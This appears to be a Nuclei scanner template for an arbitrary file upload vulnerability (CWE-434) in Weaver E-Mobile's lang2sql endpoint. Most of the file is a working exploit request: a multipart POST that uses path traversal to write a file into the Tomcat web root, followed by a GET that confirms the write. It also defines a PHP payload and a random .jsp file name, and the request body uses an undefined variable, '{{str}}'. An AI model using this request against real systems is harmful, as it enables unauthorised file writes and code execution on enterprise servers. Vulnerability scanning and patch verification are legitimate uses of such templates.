id: file-upload

info:
  name: file-upload
  author: k3ppf0r
  severity: critical
  description: |  
    泛微移动管理平台E-mobile是一款广泛使用的企业移动管理软件，旨在提供设备、应用和内容的一体化管理。然而，近期发现E-mobile的lang2sql接口存在任意文件上传漏洞，攻击者可利用该漏洞上传恶意文件，进而执行任意代码或获取敏感信息，对企业信息安全构成严重威胁。
  reference:
    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA-E-Mobile%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0lang2sql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md#poc
  remediation: |
    打对应补丁，重启服务
  classification:
    cve-id: 
    cvss-score: 9.5
    cwe-id: CWE-434
  metadata:
    date: 
    version: 
    fofa-query: 
  tags: fileupload,rce


variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"
  file_content: "file error"
  pay1: '<?php echo 11*11;unlink(__FILE__);'


http:
  - raw:
      - |
        @timeout: 10s
        POST /emp/lang2sql?client_type=1&lang_tag=1 HTTP/1.1
        Host: 127.0.0.1
        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36
        Content-Length: 265
        Content-Type: multipart/form-data; boundary=00content0boundary00
        Sl-Ce-Suid: 15
        Upgrade-Insecure-Requests: 1
        Accept-Encoding: gzip, deflate, br
        Connection: close

        --00content0boundary00
        Content-Disposition: form-data; name="source"


        --00content0boundary00
        Content-Disposition: form-data; name="file"; filename="../../../../appsvr/tomcat/webapps/ROOT/lGMXG.txt"

        {{str}}
        --00content0boundary00--
 
  - method: GET
    path:
      - "{{BaseURL}}/lGMXG.txt"

    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2, "{{str}}")'
          - 'status_code_2 == 200'
        condition: and
